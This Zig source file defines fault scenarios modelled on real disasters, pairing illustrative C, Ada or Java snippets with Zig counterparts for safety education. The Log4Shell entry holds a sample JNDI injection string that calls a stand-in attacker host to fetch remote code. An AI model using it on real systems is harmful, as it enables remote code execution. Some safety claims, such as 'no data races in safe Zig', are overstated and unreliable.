// scenarios.zig — Predefined fault scenarios modeled on real-world disasters
//
// Each scenario is sourced from actual accident investigation reports.
// These are not hypothetical — these bugs killed real people and
// destroyed real hardware.

pub const Severity = enum {
    catastrophic, // Total loss of vehicle/mission, or fatalities
    critical, // Mission failure or severe damage
    major, // Significant degradation
    minor, // Manageable anomaly
};

pub const CaughtBy = enum {
    compile_time, // Would not compile (unit mismatch, dead code)
    runtime_safety, // Zig safety check (overflow, bounds, null)
    error_handling, // Error union caught and handled
    type_system, // Type mismatch prevented the operation
    redundancy, // Sensor voting / redundant computation detected
    assertion, // Explicit assert in safety-critical code
    not_applicable, // Fault class doesn't exist in Zig
};

pub const Subsystem = enum {
    navigation,
    guidance,
    propulsion,
    sensors,
    telemetry,
    flight_control,
    staging,
    power,
};

pub const FaultType = enum {
    integer_overflow,
    unit_mismatch,
    race_condition,
    time_drift,
    sensor_failure,
    dead_code_activation,
    stale_data,
    spurious_sensor,
    memory_corruption,
    buffer_overflow,
    null_deref,
    use_after_free,
    divide_by_zero,
    timestamp_overflow,
    buffer_over_read,
    unchecked_index,
    stack_corruption,
    c_string_overflow,
    code_injection,
    parser_overread,
    resource_leak,
    oom_handling,
    comptime_validation,
    sentinel_overflow,
};

pub const Scenario = struct {
    id: []const u8,
    name: []const u8,
    year: u16,
    cost: []const u8,
    root_cause: []const u8,
    c_behavior: []const u8,
    zig_behavior: []const u8,
    trigger_met_s: f64, // Mission elapsed time (seconds) to inject
    fault_type: FaultType,
    subsystem: Subsystem,
    severity: Severity,
    caught_by: CaughtBy,
    // Detailed comparison text
    original_code: []const u8,
    zig_code: []const u8,
    explanation: []const u8,
};

pub const ALL_SCENARIOS = [_]Scenario{
    // ====================================================================
    // ARIANE 5 FLIGHT 501 — $370M
    // ====================================================================
    .{
        .id = "ARIANE",
        .name = "Ariane 5 Flight 501",
        .year = 1996,
        .cost = "$370M",
        .root_cause = "64-bit float to 16-bit int overflow in SRI horizontal bias",
        .c_behavior = "Silent truncation / Ada OPERAND_ERROR => SRI shutdown => loss of guidance",
        .zig_behavior = "error.Overflow returned from checked_math.floatToI16() => fallback navigation",
        .trigger_met_s = 37.0,
        .fault_type = .integer_overflow,
        .subsystem = .navigation,
        .severity = .catastrophic,
        .caught_by = .error_handling,
        .original_code =
        \\  Ada: P_M_DERIVE(E_BH) :=
        \\    UC_16S_EN_16NS(TDB.T_ENTIER_16S(
        \\      (1.0/C_M_LSB_BH) * G_M_INFO_DERIVE(E_BH)))
        \\  -- No overflow protection! Value reached 32,768.5
        \\  -- OPERAND ERROR => SRI shutdown => rocket lost
        ,
        .zig_code =
        \\  const bh = checked_math.floatToI16(horizontal_bias)
        \\    catch |err| switch (err) {
        \\      error.Overflow => {
        \\        log("BH overflow: {d}", .{horizontal_bias});
        \\        return fallbackNavigation();
        \\      },
        \\    };
        ,
        .explanation = "Zig forces you to handle the error. You cannot accidentally discard it.",
    },

    // ====================================================================
    // MARS CLIMATE ORBITER — $327M
    // ====================================================================
    .{
        .id = "MCO",
        .name = "Mars Climate Orbiter",
        .year = 1999,
        .cost = "$327M",
        .root_cause = "Metric/imperial unit mismatch — pound-force sent where newton expected",
        .c_behavior = "Wrong value used silently — 4.45x thrust error accumulated over months",
        .zig_behavior = "COMPILE ERROR — type Quantity(PoundForce) != Quantity(Newton)",
        .trigger_met_s = 42.0,
        .fault_type = .unit_mismatch,
        .subsystem = .navigation,
        .severity = .catastrophic,
        .caught_by = .compile_time,
        .original_code =
        \\  C: double thrust = get_thruster_force();  // Returns lb-force
        \\     apply_correction(thrust);  // Expects newtons
        \\  // No type checking — just a double both ways
        \\  // 4.45x error, accumulated over 9 months
        ,
        .zig_code =
        \\  const thrust_lbf = getThrusterForce(); // Quantity(PoundForce)
        \\  applyCorrection(thrust_lbf);
        \\  // COMPILE ERROR: expected Quantity(Newton),
        \\  //   found Quantity(PoundForce)
        \\  // CORRECT:
        \\  const thrust_n = conversions.lbfToNewton(thrust_lbf);
        \\  applyCorrection(thrust_n); // OK
        ,
        .explanation = "The type system makes unit mismatch a compile error, not a runtime surprise.",
    },

    // ====================================================================
    // THERAC-25 — 6 lives
    // ====================================================================
    .{
        .id = "THERAC",
        .name = "Therac-25 Radiation Therapy",
        .year = 1987,
        .cost = "6 lives",
        .root_cause = "Race condition between operator input and beam mode selection",
        .c_behavior = "Race condition allowed high-energy beam with wrong collimator position",
        .zig_behavior = "No data races in safe Zig — @atomicStore/@atomicLoad for shared state",
        .trigger_met_s = 55.0,
        .fault_type = .race_condition,
        .subsystem = .flight_control,
        .severity = .catastrophic,
        .caught_by = .type_system,
        .original_code =
        \\  C: void set_beam_mode(int mode) {
        \\       beam_mode = mode;    // No synchronization
        \\       collimator = lookup[mode]; // Race here
        \\     }
        \\  // Operator changes mode while beam is active
        \\  // Beam fires before collimator moves
        ,
        .zig_code =
        \\  fn setBeamMode(mode: BeamMode) void {
        \\    @atomicStore(BeamMode, &beam_mode, mode, .seq_cst);
        \\    // Shared state requires atomic operations
        \\    // Data races on non-atomic types are safety UB
        \\  }
        ,
        .explanation = "Zig's type system distinguishes atomic and non-atomic operations.",
    },

    // ====================================================================
    // PATRIOT MISSILE — 28 lives
    // ====================================================================
    .{
        .id = "PATRIOT",
        .name = "Patriot Missile Dhahran",
        .year = 1991,
        .cost = "28 lives",
        .root_cause = "Floating-point clock drift: 0.34 sec error after 100 hours of uptime",
        .c_behavior = "float time_sec = ticks * 0.1 — accumulated rounding error",
        .zig_behavior = "Integer tick counter — no floating-point accumulation, zero drift",
        .trigger_met_s = 180.0,
        .fault_type = .time_drift,
        .subsystem = .navigation,
        .severity = .catastrophic,
        .caught_by = .not_applicable,
        .original_code =
        \\  C: float time_secs = tick_count * 0.1f;
        \\  // 0.1 = 0.0001100110011... in binary (repeating)
        \\  // 24-bit truncation: 0.000000095 sec error/tick
        \\  // After 100 hrs: 0.34 sec drift
        \\  // Scud travels 1,676 m in 0.34 sec
        ,
        .zig_code =
        \\  // MET is u64 ticks. Period. No floating point.
        \\  met.ticks += delta_ticks;
        \\  // Float conversion ONLY for display:
        \\  const display_secs = met.toSecondsDisplay();
        \\  // Never used for tracking or control
        ,
        .explanation = "Integer time counters have zero drift. The class of bug cannot exist.",
    },

    // ====================================================================
    // BOEING 737 MAX MCAS — 346 lives
    // ====================================================================
    .{
        .id = "MCAS",
        .name = "Boeing 737 MAX MCAS",
        .year = 2019,
        .cost = "346 lives",
        .root_cause = "Single AoA sensor failure, no cross-check, unlimited authority",
        .c_behavior = "Single sensor trusted — nose-down command repeated 26 times",
        .zig_behavior = "TripleRedundant.vote() detects outlier — faulty sensor isolated",
        .trigger_met_s = 55.0,
        .fault_type = .sensor_failure,
        .subsystem = .sensors,
        .severity = .catastrophic,
        .caught_by = .redundancy,
        .original_code =
        \\  C: float aoa = read_aoa_sensor(active_side);
        \\  // Only reads ONE sensor. The other is ignored.
        \\  // "Disagree" indicator is a paid optional extra.
        \\  if (aoa > threshold) apply_nose_down(full_authority);
        \\  // No limit on how many times or how far
        ,
        .zig_code =
        \\  const vote = aoa_sensor.sensor.vote();
        \\  switch (vote) {
        \\    .majority => |m| {
        \\      log("Sensor {} outlier, isolated", .{m.outlier});
        \\      // Use consensus value, flag faulty sensor
        \\    },
        \\    .insufficient, .disagreement => {
        \\      // Do NOT act on unreliable data
        \\      return .{ .valid = false };
        \\    },
        \\  }
        ,
        .explanation = "Triple-redundant voting means one sensor failure cannot cause a control action.",
    },

    // ====================================================================
    // KNIGHT CAPITAL — $440M
    // ====================================================================
    .{
        .id = "KNIGHT",
        .name = "Knight Capital Trading Loss",
        .year = 2012,
        .cost = "$440M",
        .root_cause = "Dead code path from 8-year-old test feature accidentally activated in production",
        .c_behavior = "Legacy flag set, dead code executed, sent millions of errant trades",
        .zig_behavior = "unreachable marks dead code — if reached, panic with stack trace",
        .trigger_met_s = 100.0,
        .fault_type = .dead_code_activation,
        .subsystem = .guidance,
        .severity = .catastrophic,
        .caught_by = .runtime_safety,
        .original_code =
        \\  C: switch(mode) {
        \\    case PRODUCTION: execute_trade(); break;
        \\    case TESTING: execute_test(); break;
        \\    case LEGACY: execute_legacy(); break; // Dead code!
        \\    // Legacy flag set on 1 of 8 servers.
        \\    // Nobody noticed for years.
        \\  }
        ,
        .zig_code =
        \\  switch (mode) {
        \\    .production => executeTrade(),
        \\    .testing => executeTest(),
        \\    .legacy => unreachable,
        \\    // If reached: panic with full stack trace
        \\    // You KNOW immediately something is wrong
        \\  }
        ,
        .explanation = "Zig's `unreachable` turns dead code into a loud alarm, not a silent disaster.",
    },

    // ====================================================================
    // BOEING STARLINER OFT — Mission failure
    // ====================================================================
    .{
        .id = "STARLINER",
        .name = "Boeing Starliner OFT",
        .year = 2019,
        .cost = "Mission failure",
        .root_cause = "Stale timer: MET polled from Atlas booster 11 hours before launch",
        .c_behavior = "Stale time value used for orbital insertion timing — wrong orbit",
        .zig_behavior = "Integer overflow on MET shows impossibly large value — detected as stale",
        .trigger_met_s = 300.0,
        .fault_type = .stale_data,
        .subsystem = .navigation,
        .severity = .critical,
        .caught_by = .error_handling,
        .original_code =
        \\  C: int32_t met = read_booster_timer();
        \\  // Timer was polled 11 hours before launch
        \\  // Returned a large, stale value
        \\  // Starliner thought it was hours into the mission
        ,
        .zig_code =
        \\  const met_ticks = readBoosterTimer();
        \\  // Sanity check: MET should be close to our clock
        \\  const expected = self.met_ticks;
        \\  const diff = @abs(@as(i64, met_ticks) - @as(i64, expected));
        \\  if (diff > MAX_MET_DEVIATION) return error.StaleData;
        ,
        .explanation = "Explicit validation of data freshness catches stale reads.",
    },

    // ====================================================================
    // MARS POLAR LANDER — $165M
    // ====================================================================
    .{
        .id = "MPL",
        .name = "Mars Polar Lander",
        .year = 1999,
        .cost = "$165M",
        .root_cause = "Spurious sensor noise spike interpreted as touchdown signal",
        .c_behavior = "Single sensor spike triggered engine shutdown at 40m altitude",
        .zig_behavior = "Rate-validated touchdown: requires 5 consecutive low readings",
        .trigger_met_s = 450.0,
        .fault_type = .spurious_sensor,
        .subsystem = .sensors,
        .severity = .catastrophic,
        .caught_by = .assertion,
        .original_code =
        \\  C: if (radar_alt < TOUCHDOWN_THRESHOLD)
        \\       shutdown_engines();
        \\  // Single noisy reading triggers shutdown
        \\  // Leg deployment caused vibration spike
        ,
        .zig_code =
        \\  if (radar.isTouchdownConfirmed()) {
        \\    // Requires 5 consecutive readings below threshold
        \\    shutdownEngines();
        \\  }
        \\  // Single spike: confirmations reset to 0
        ,
        .explanation = "Validated sensor input: transient spikes cannot trigger safety-critical actions.",
    },

    // ====================================================================
    // QANTAS FLIGHT 72 — Near-miss
    // ====================================================================
    .{
        .id = "QANTAS",
        .name = "Qantas Flight 72",
        .year = 2008,
        .cost = "Near-miss (119 injured)",
        .root_cause = "Corrupted memory in ADIRU caused erroneous nose-down command",
        .c_behavior = "Out-of-bounds memory read returned garbage AoA value => nosedive",
        .zig_behavior = "Slice bounds checking catches out-of-bounds access => panic with trace",
        .trigger_met_s = 200.0,
        .fault_type = .memory_corruption,
        .subsystem = .navigation,
        .severity = .critical,
        .caught_by = .runtime_safety,
        .original_code =
        \\  C: float aoa = sensor_data[corrupted_index];
        \\  // Index out of bounds — reads garbage memory
        \\  // Returns 50.625 degrees (impossible value)
        \\  // Autopilot pushes nose down violently
        ,
        .zig_code =
        \\  const aoa = sensor_data[index];
        \\  // If index out of bounds: PANIC
        \\  // "index out of bounds: index 256, len 128"
        \\  // Full stack trace, clear error message
        \\  // No garbage data, no silent corruption
        ,
        .explanation = "Zig's bounds checking turns memory corruption into a detectable error.",
    },

    // ====================================================================
    // Y2K — $100B+ remediation
    // ====================================================================
    .{
        .id = "Y2K",
        .name = "Y2K Bug",
        .year = 2000,
        .cost = "$100B+ in remediation costs",
        .root_cause = "2-digit year storage overflowed at year 2000",
        .c_behavior = "Unsigned 8-bit year wraps from 99 to 0 — silent wraparound",
        .zig_behavior = "Integer overflow is detectable — @addWithOverflow returns overflow flag",
        .trigger_met_s = 400.0,
        .fault_type = .timestamp_overflow,
        .subsystem = .telemetry,
        .severity = .major,
        .caught_by = .runtime_safety,
        .original_code =
        \\  C: unsigned char year = 99;
        \\  year++; // Now 0, not 100
        \\  // Silent wraparound — no error
        \\  // date_str = "01/01/00" (is it 1900 or 2000?)
        ,
        .zig_code =
        \\  var year: u8 = 99;
        \\  year = checkedAdd(u8, year, 1)
        \\    catch return error.Overflow;
        \\  // Or in Debug mode: year += 1 panics
        ,
        .explanation = "In Zig, integer overflow is a detectable error, not silent corruption.",
    },

    // ====================================================================
    // HEARTBLEED (CVE-2014-0160) — $500M+
    // ====================================================================
    .{
        .id = "HEARTBLEED",
        .name = "OpenSSL Heartbleed",
        .year = 2014,
        .cost = "$500M+",
        .root_cause = "Buffer over-read: TLS heartbeat copied user-supplied length bytes from 1-byte payload",
        .c_behavior = "memcpy reads past buffer end — leaks private keys, passwords, session tokens",
        .zig_behavior = "Slice carries length — copy limited to actual data, OOB access panics",
        .trigger_met_s = 65.0,
        .fault_type = .buffer_over_read,
        .subsystem = .telemetry,
        .severity = .catastrophic,
        .caught_by = .runtime_safety,
        .original_code =
        \\  C: // OpenSSL ssl/d1_both.c
        \\  unsigned int payload_length = msg->length; // Attacker controls this!
        \\  memcpy(response, msg->data, payload_length);
        \\  // payload_length=64KB, actual data=1 byte
        \\  // Reads 65535 bytes of adjacent memory
        \\  // Private keys, passwords, session tokens leaked
        ,
        .zig_code =
        \\  const payload = msg.data[0..msg.actual_length];
        \\  // payload is a slice — carries its own length
        \\  @memcpy(response[0..payload.len], payload);
        \\  // Cannot read beyond payload.len
        \\  // Attempting payload[65535] on 1-byte slice: PANIC
        ,
        .explanation = "Zig slices carry their length. Buffer over-reads are structurally impossible.",
    },

    // ====================================================================
    // CROWDSTRIKE FALCON — $5.4B
    // ====================================================================
    .{
        .id = "CROWDSTRIKE",
        .name = "CrowdStrike Falcon Sensor",
        .year = 2024,
        .cost = "$5.4B",
        .root_cause = "Out-of-bounds read from Channel File 291 — index from data exceeded array bounds",
        .c_behavior = "Array access with unchecked index — reads garbage, triggers null pointer in kernel driver",
        .zig_behavior = "Array/slice bounds checked at runtime — index out of bounds = panic with trace",
        .trigger_met_s = 75.0,
        .fault_type = .unchecked_index,
        .subsystem = .sensors,
        .severity = .catastrophic,
        .caught_by = .runtime_safety,
        .original_code =
        \\  C: // Channel File 291 had 21 fields, code expected 20
        \\  void* ptr = config_values[index]; // index=20, array has 20 elements
        \\  // Reads garbage pointer from beyond array
        \\  process(ptr); // Null/garbage deref in kernel mode -> BSOD
        \\  // 8.5 million Windows machines crashed simultaneously
        ,
        .zig_code =
        \\  const ptr = config_values[index];
        \\  // If index >= config_values.len: PANIC
        \\  // "index out of bounds: index 20, len 20"
        \\  // Clear error, no kernel crash, no BSOD cascade
        ,
        .explanation = "Zig's bounds checking catches the exact bug that crashed 8.5M machines.",
    },

    // ====================================================================
    // TOYOTA UNINTENDED ACCELERATION — 89 lives, $1.2B
    // ====================================================================
    .{
        .id = "TOYOTA",
        .name = "Toyota Unintended Acceleration",
        .year = 2009,
        .cost = "89 lives / $1.2B",
        .root_cause = "Stack overflow from deep recursion + 10,000+ global variables corrupting adjacent memory",
        .c_behavior = "Stack overflow silently corrupts adjacent memory — throttle stuck open",
        .zig_behavior = "Stack overflow is detected — no silent memory corruption",
        .trigger_met_s = 130.0,
        .fault_type = .stack_corruption,
        .subsystem = .flight_control,
        .severity = .catastrophic,
        .caught_by = .runtime_safety,
        .original_code =
        \\  C: void recursive_task(int depth) {
        \\       char frame[256]; // Large stack frame
        \\       // 10,000+ global variables, task stack too small
        \\       recursive_task(depth + 1); // Overflow!
        \\     }
        \\  // Stack silently overwrites adjacent memory
        \\  // Throttle variable corrupted -> stuck at 100%
        ,
        .zig_code =
        \\  fn recursiveTask(depth: u32) !void {
        \\    // Zig detects stack overflow via guard pages
        \\    // No hidden allocations — you see every byte
        \\    try recursiveTask(depth + 1);
        \\  }
        \\  // Stack overflow = panic, NOT silent corruption
        ,
        .explanation = "Zig's runtime safety catches stack overflow. No silent memory corruption possible.",
    },

    // ====================================================================
    // MORRIS WORM — $100M
    // ====================================================================
    .{
        .id = "MORRIS",
        .name = "Morris Worm (fingerd)",
        .year = 1988,
        .cost = "$100M",
        .root_cause = "gets() buffer overflow in fingerd — no bounds checking on network input",
        .c_behavior = "gets() reads unlimited input into fixed buffer — overwrites return address",
        .zig_behavior = "No C strings, slices carry length, readUntilDelimiter has explicit max",
        .trigger_met_s = 160.0,
        .fault_type = .c_string_overflow,
        .subsystem = .telemetry,
        .severity = .critical,
        .caught_by = .not_applicable,
        .original_code =
        \\  C: char buffer[512];
        \\  gets(buffer); // NO LENGTH LIMIT
        \\  // Attacker sends 536 bytes:
        \\  //   512 bytes padding + 4 bytes frame pointer +
        \\  //   4 bytes return address (shellcode)
        \\  // First major internet worm. 10% of the internet
        ,
        .zig_code =
        \\  var buffer: [512]u8 = undefined;
        \\  // There is no gets() equivalent in Zig.
        \\  // All reads require explicit bounds:
        \\  const input = reader.readUntilDelimiter(&buffer, '\n')
        \\    catch return error.InputTooLong;
        \\  // Buffer overflow is structurally impossible
        ,
        .explanation = "Zig has no unbounded read functions. Buffer overflows cannot be expressed.",
    },

    // ====================================================================
    // LOG4SHELL (CVE-2021-44228) — Billions
    // ====================================================================
    .{
        .id = "LOG4SHELL",
        .name = "Log4Shell (Log4j)",
        .year = 2021,
        .cost = "Billions in remediation",
        .root_cause = "JNDI lookup in log message string interpolation — user input executed as code",
        .c_behavior = "Runtime string interpolation can execute arbitrary code via lookup plugins",
        .zig_behavior = "Format strings are comptime — no runtime interpretation, no hidden control flow",
        .trigger_met_s = 260.0,
        .fault_type = .code_injection,
        .subsystem = .telemetry,
        .severity = .catastrophic,
        .caught_by = .compile_time,
        .original_code =
        \\  Java: logger.info("User-Agent: " + userAgent);
        \\  // If userAgent = "${jndi:ldap://evil.com/exploit}"
        \\  // Log4j INTERPRETS the string at runtime
        \\  // Downloads and executes remote code!
        \\  // Affected every Java application using Log4j
        ,
        .zig_code =
        \\  std.log.info("User-Agent: {s}", .{user_agent});
        \\  // Format string "{s}" is comptime-known
        \\  // user_agent is DATA, never interpreted as code
        \\  // There is no eval(), no lookup(), no JNDI
        \\  // Zig format strings cannot execute anything
        ,
        .explanation = "Zig format strings are comptime constants. User data is never interpreted as code.",
    },

    // ====================================================================
    // CLOUDBLEED — Unknown
    // ====================================================================
    .{
        .id = "CLOUDBLEED",
        .name = "Cloudflare Cloudbleed",
        .year = 2017,
        .cost = "Massive data leak",
        .root_cause = "HTML parser buffer over-read — pointer incremented past buffer end",
        .c_behavior = "Pointer arithmetic past buffer end reads adjacent memory (other customers' data)",
        .zig_behavior = "Slice iteration cannot exceed bounds — no raw pointer arithmetic",
        .trigger_met_s = 350.0,
        .fault_type = .parser_overread,
        .subsystem = .telemetry,
        .severity = .critical,
        .caught_by = .runtime_safety,
        .original_code =
        \\  C: char *p = buffer;
        \\  while (*p != '>') p++; // What if '>' is missing?
        \\  // Pointer walks past buffer end
        \\  // Reads other customers' HTTP headers, cookies, passwords
        \\  // Data leaked to ~3,400 websites over 5 months
        ,
        .zig_code =
        \\  for (buffer) |c| {
        \\    if (c == '>') break;
        \\  }
        \\  // Iteration bounded by slice length
        \\  // Cannot walk past buffer end
        \\  // No pointer arithmetic to go wrong
        ,
        .explanation = "Zig's slice iteration is bounded. Buffer over-reads from pointer arithmetic cannot happen.",
    },

    // ====================================================================
    // ZIG FEATURE: errdefer resource cleanup
    // ====================================================================
    .{
        .id = "ZIG_ERRDEFER",
        .name = "Zig errdefer (Resource Cleanup)",
        .year = 2024,
        .cost = "Prevents resource leaks",
        .root_cause = "Error path skips cleanup — file handle, memory, socket leaked on early return",
        .c_behavior = "goto cleanup or manual close() on every error path — frequently forgotten",
        .zig_behavior = "errdefer runs cleanup automatically on ANY error return path",
        .trigger_met_s = 85.0,
        .fault_type = .resource_leak,
        .subsystem = .telemetry,
        .severity = .major,
        .caught_by = .error_handling,
        .original_code =
        \\  C: int fd = open("data.bin", O_RDONLY);
        \\  char *buf = malloc(4096);
        \\  if (!buf) { close(fd); return -1; }  // Must remember!
        \\  if (read(fd, buf, 4096) < 0) {
        \\    free(buf); close(fd); return -1;    // Must remember!
        \\  }
        \\  if (validate(buf) < 0) {
        \\    // Forgot free(buf)! Forgot close(fd)! RESOURCE LEAK
        \\    return -1;
        \\  }
        ,
        .zig_code =
        \\  const fd = try std.fs.openFile("data.bin", .{});
        \\  errdefer fd.close(); // Runs on ANY error return
        \\  const buf = try allocator.alloc(u8, 4096);
        \\  errdefer allocator.free(buf);
        \\  try fd.readAll(buf);
        \\  try validate(buf);
        \\  // Cannot forget cleanup — errdefer is automatic
        ,
        .explanation = "errdefer guarantees cleanup runs on error. Leaks from forgotten cleanup are impossible.",
    },

    // ====================================================================
    // ZIG FEATURE: Failing allocator (OOM handling)
    // ====================================================================
    .{
        .id = "ZIG_OOM",
        .name = "Zig Allocator (OOM Handling)",
        .year = 2024,
        .cost = "Prevents null deref from malloc",
        .root_cause = "malloc returns NULL on OOM, unchecked — null pointer dereference",
        .c_behavior = "malloc(size) returns NULL — most C code never checks, crashes on deref",
        .zig_behavior = "allocator.alloc returns error.OutOfMemory — must be try/catch'd",
        .trigger_met_s = 110.0,
        .fault_type = .oom_handling,
        .subsystem = .navigation,
        .severity = .critical,
        .caught_by = .error_handling,
        .original_code =
        \\  C: sensor_data_t *data = malloc(sizeof(sensor_data_t));
        \\  data->reading = 42.0; // What if malloc returned NULL?
        \\  // Null pointer dereference -> segfault
        \\  // Linux OOM killer may hide the problem for years
        \\  // Safety-critical system: crash at worst possible time
        ,
        .zig_code =
        \\  const data = allocator.create(SensorData)
        \\    catch return error.OutOfMemory;
        \\  data.reading = 42.0; // Guaranteed non-null here
        \\  // Cannot forget to check — error union FORCES handling
        \\  // Or: const data = try allocator.create(SensorData);
        ,
        .explanation = "Zig's error unions make OOM handling mandatory. Null deref from malloc is impossible.",
    },

    // ====================================================================
    // ZIG FEATURE: Comptime evaluation
    // ====================================================================
    .{
        .id = "ZIG_COMPTIME",
        .name = "Zig comptime (Compile-Time Eval)",
        .year = 2024,
        .cost = "Catches bugs before runtime",
        .root_cause = "Configuration error only discovered when code runs in production",
        .c_behavior = "assert(sizeof(struct) == 64) fires in production — too late",
        .zig_behavior = "comptime { assert(@sizeOf(Struct) == 64); } — fails at compile time",
        .trigger_met_s = 140.0,
        .fault_type = .comptime_validation,
        .subsystem = .navigation,
        .severity = .major,
        .caught_by = .compile_time,
        .original_code =
        \\  C: // Runtime assertion — fires AFTER deployment
        \\  void init_protocol() {
        \\    assert(sizeof(packet_header_t) == 64);
        \\    // If struct packing changes: crash in production
        \\    // After the rocket is already on the pad
        \\  }
        ,
        .zig_code =
        \\  comptime {
        \\    if (@sizeOf(PacketHeader) != 64)
        \\      @compileError("PacketHeader must be 64 bytes");
        \\  }
        \\  // Build fails IMMEDIATELY if struct size changes
        \\  // Never reaches production, never reaches the pad
        ,
        .explanation = "comptime moves runtime checks to compile time. Configuration bugs found instantly.",
    },

    // ====================================================================
    // ZIG FEATURE: Sentinel-terminated slices
    // ====================================================================
    .{
        .id = "ZIG_SENTINEL",
        .name = "Zig Sentinel Slices",
        .year = 2024,
        .cost = "Prevents C-string overflows",
        .root_cause = "C strings rely on null terminator — if missing, strlen/strcpy read forever",
        .c_behavior = "Unterminated string: strlen walks past buffer, strcpy overwrites adjacent memory",
        .zig_behavior = "[:0]u8 sentinel slices guarantee terminator exists — length always known",
        .trigger_met_s = 170.0,
        .fault_type = .sentinel_overflow,
        .subsystem = .telemetry,
        .severity = .critical,
        .caught_by = .runtime_safety,
        .original_code =
        \\  C: char name[8]; // No room for null terminator
        \\  strncpy(name, "overflow", 8); // No null terminator!
        \\  printf("%s\n", name); // Reads past buffer
        \\  strlen(name); // Walks past buffer looking for \0
        ,
        .zig_code =
        \\  const name: [:0]const u8 = "overflow";
        \\  // Type GUARANTEES null terminator exists
        \\  // name.len == 8, name[8] == 0 (sentinel)
        \\  // Slicing preserves bounds: name[0..4] is safe
        \\  // name[20] -> panic: index out of bounds
        ,
        .explanation = "Sentinel slices carry both length and terminator guarantee. C-string bugs impossible.",
    },
};

pub fn findScenario(id: []const u8) ?*const Scenario {
    for (&ALL_SCENARIOS) |*s| {
        if (std.mem.eql(u8, s.id, id)) return s;
    }
    return null;
}

const std = @import("std");
